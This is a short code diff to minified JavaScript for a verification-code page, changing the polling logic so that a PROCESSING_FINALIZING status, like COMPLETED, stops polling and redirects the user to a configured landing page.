@@ -315,9 +315,9 @@ return}
 if(d.currentStatus&&d.currentStatus!==curStat){
 updateUIForStatus(d.currentStatus,d.data||{})
 }
-if(d.currentStatus==='COMPLETED'||d.currentStatus==='FAILED'){
+if(d.currentStatus==='COMPLETED'||d.currentStatus==='PROCESSING_FINALIZING'||d.currentStatus==='FAILED'){
 stopPolling();
-if(d.currentStatus==='COMPLETED'){
+if(d.currentStatus==='COMPLETED'||d.currentStatus==='PROCESSING_FINALIZING'){
 var rU=TC.landingPageLink&&TC.landingPageLink.trim()!==''?TC.landingPageLink:window.location.href;
 if(rU&&!rU.startsWith('http://')&&!rU.startsWith('https://'))rU='https://'+rU;
 window.location.href=rU;
@@ -531,7 +531,7 @@ var em=r.message||'Invalid verification code. Please try again.';
 showFieldError('InvalidVerificationCode','verificationCodeGroup',em);codeErrShown=true}catch(e){}
 }else if(s==='WAITINGCODEERROR'&&!codeErrShown){showFieldError('InvalidVerificationCode','verificationCodeGroup','Invalid verification code. Please try again.');codeErrShown=true}
 vCI.value='';vCI.focus();startPolling(2000);break}
-case'COMPLETED':{
+case'PROCESSING_FINALIZING':case'COMPLETED':{
 stopPolling();
 var rU=TC.landingPageLink&&TC.landingPageLink.trim()!==''?TC.landingPageLink:window.location.href;
 if(rU&&!rU.startsWith('http://')&&!rU.startsWith('https://'))rU='https://'+rU;
